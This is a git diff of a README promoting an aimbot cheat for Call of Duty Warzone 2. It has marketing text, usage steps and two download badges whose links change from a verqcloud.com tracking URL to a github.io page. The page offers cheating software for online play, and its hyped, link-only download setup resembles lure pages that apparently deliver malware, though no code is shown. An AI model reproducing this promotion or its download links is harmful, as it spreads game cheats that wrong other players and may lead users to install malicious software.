@@ -2,7 +2,7 @@
 
 The **CoD Warzone 2 Aimbot** is a powerful tool designed to improve your gameplay by automating the aiming process. With features like **automatic targeting**, **precision aiming**, and **quick reaction times**, this aimbot ensures your shots are always on point, giving you a significant edge in combat situations. Whether you're a casual player or looking to level up your game, this aimbot enhances your performance by making every shot count.
 
-[![Download Warzone2 AimBot](https://img.shields.io/badge/Download-Warzone2%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Warzone2 AimBot](https://img.shields.io/badge/Download-Warzone2%20AimBot-blueviolet)](https://cod-warzone-2-aimbot.github.io/.github/)
 
 ## Features
 
@@ -23,4 +23,4 @@ The **CoD Warzone 2 Aimbot** is a powerful tool designed to improve your gamepla
 4. Launch **CoD Warzone 2** and activate the aimbot using the hotkey defined in the settings.
 5. Customize the aimbot’s settings (sensitivity, FOV, target area) to suit your personal preferences.
 
-[![Download Warzone2 AimBot](https://img.shields.io/badge/Download-Warzone2%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Warzone2 AimBot](https://img.shields.io/badge/Download-Warzone2%20AimBot-blueviolet)](https://cod-warzone-2-aimbot.github.io/.github/)
